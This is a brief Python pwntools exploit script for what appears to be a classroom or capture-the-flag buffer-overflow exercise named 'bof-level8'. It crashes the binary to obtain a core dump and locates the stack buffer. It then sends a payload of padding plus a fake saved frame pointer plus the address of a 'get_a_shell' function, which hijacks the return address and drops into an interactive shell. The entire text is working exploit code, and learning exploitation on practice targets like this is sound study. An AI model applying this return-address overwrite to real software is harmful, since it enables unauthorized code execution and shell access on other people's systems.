# week2-bof-level8
#!/usr/bin/env python

from pwn import *
import os

env = {
        'ENVENVENV' : 'a'*200,
}                               


p = process('./bof-level8', env=env)

# sample buffer
buf = "A" * 0x80 + "\x00"

# generate core
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()

c = Core('./core')

buffer_addr = c.stack.find(buf)
print(hex(buffer_addr))

e = ELF('./bof-level8')

addr_of_get_a_shell = e.symbols['get_a_shell']

buf = "A" * 16 + "BBBBBBBB" + p64(addr_of_get_a_shell)

buf = buf + "C" * (0x80 - len(buf))  + "\x00"

p.sendline(buf)

p.interactive()
